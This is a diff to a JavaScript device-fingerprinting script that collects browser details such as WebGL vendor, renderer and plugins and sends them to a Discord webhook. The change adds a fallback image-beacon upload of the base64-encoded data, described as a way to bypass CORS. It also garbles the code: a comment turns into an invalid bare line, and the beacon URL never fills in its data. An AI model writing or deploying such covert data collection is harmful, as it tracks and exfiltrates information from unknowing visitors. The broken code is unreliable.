@@ -159,16 +159,32 @@ async function sendDeviceInfoToWebhook() {
             embeds: [embed]
         };
 
-        // Send to Discord webhook
-        await fetch(DISCORD_WEBHOOK_URL, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-        });
-
-        console.log("Device information sent successfully");
+        // Try multiple methods to send to Discord
+        try {
+            // Method 1: Direct fetch
+            const response = await fetch(DISCORD_WEBHOOK_URL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            });
+            
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            
+            console.log("Device information sent successfully");
+        } catch (fetchError) {
+            console.error("Fetch method failed:", fetchError);
+            
+            // Method 2: Using image beacon (more likely to bypass CORS)
+            const beaconData = btoa(JSON.stringify(payload));
+            const img = new Image();
+            img.src = `https://discord.com/api/webhooks/${DISCORD_WEBHOOK_URL.split('/').slice(-2).join('/')}/beacon?data=\${beaconData}`;
+            
+            console.log("Beacon method attempted");
+        }
     } catch (error) {
         console.error("Error sending device information:", error);
     }
@@ -225,12 +241,9 @@ function getWebGLInfo() {
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
         if (!gl) return { error: "WebGL not supported" };
         
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
         return {
             vendor: gl.getParameter(gl.VENDOR),
-            renderer: gl.getParameter(gl.RENDERER),
-            unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Not available",
-            unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Not available"
+            renderer: gl.getParameter(gl.RENDERER)
         };
     } catch (e) {
         return { error: "Unable to get WebGL info" };
@@ -261,7 +274,7 @@ function isSessionStorageAvailable() {
     }
 }
 
-// Function to check IndexedDB availability
+check IndexedDB availability
 function isIndexedDBAvailable() {
     return 'indexedDB' in window;
 }
@@ -273,7 +286,7 @@ function getPlugins() {
         for (let i = 0; i < navigator.plugins.length; i++) {
             plugins.push(navigator.plugins[i].name);
         }
-}
+    }
     return plugins;
 }
 
